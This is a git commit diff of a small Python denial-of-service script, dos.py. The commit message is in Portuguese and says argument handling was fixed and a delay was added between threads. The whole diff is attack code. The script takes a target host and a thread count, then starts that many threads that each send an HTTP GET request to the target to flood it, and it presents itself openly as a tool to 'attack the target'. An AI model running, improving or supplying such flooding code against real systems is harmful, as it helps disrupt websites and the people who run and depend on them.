1d86d0fa1e0120c21baf7795e04aedd1eccf31ac
Thiago Bodruk <thiagobodruk@gmail.com>
2017-03-23 16:17:11 -0300

    Update dos.py
    Corrigido o sistema de passagem de argumentos e adicionado um delay na abertura das threads

--- dos/dos.py
+++ dos/dos.py
@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python
+#!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 import argparse, urllib.request, time
 from threading import Thread
@@ -7,28 +7,38 @@ host, threads = [None , 0]
 
 def main():
 	parser = argparse.ArgumentParser(description='Attack the target with GET requests')
-	parser.add_argument('host', help='The target host')
-	parser.add_argument('threads', type=int, help='Number of attack threads')
+	parser.add_argument('--host', help='The target host')
+	parser.add_argument('--threads', type=int, help='Number of attack threads')
 	parsed = parser.parse_args()
-	host = input('Host: ')
-	threads = int(input('Number of Threads: '))
+	
+	if parsed.host:
+		host = parsed.host
+	else:
+		host = input('Host: ')
+
+	if parsed.threads:
+		threads = parsed.threads
+	else:
+		threads = int(input('Number of Threads: '))
+
 	try:
 		attack(host, threads)
 	except:
 		print('Cannot create a new thread...')
 
-def connect(host):
+def connect(host,i=0):
 	try:
 		response = urllib.request.urlopen('http://%s' % (host)).read()
 	except:
-		print('Cannot connect to %s...' % host)
+		print('Cannot connect thread #%d to %s...' % (i, host))
 
 def attack(host, threads):
-	print('\nATTACKING...\n')
+	print('\nAttacking %s with %d threads...\n' % (host, threads))
 	for i in range(threads):
-		t = Thread(target=connect, args=(host,))
-		print('Thread #%d: Attacking...' % i)
+		t = Thread(target=connect, args=(host,i,))
+		print('Connecting thread #%d...' % i)
 		t.start()
+		time.sleep(0.01)
 	
 if __name__ == '__main__':
 	main()
